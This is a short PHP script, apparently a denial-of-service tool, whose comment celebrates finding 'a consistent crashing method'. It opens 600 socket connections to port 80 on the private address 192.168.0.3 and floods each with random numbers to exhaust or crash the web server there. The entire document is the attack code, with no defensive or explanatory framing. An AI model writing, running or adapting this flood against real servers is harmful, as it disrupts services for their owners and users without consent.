<?php
//FINALLY, a consistent crashing method!
for($i = 0; $i < 600; $i ++) {
    $connection[$i] = fsockopen('192.168.0.3', 80);
    for($x = 0; $x < 60; $x ++) {
        fwrite($connection[$i], rand(1, 10000));
    }
}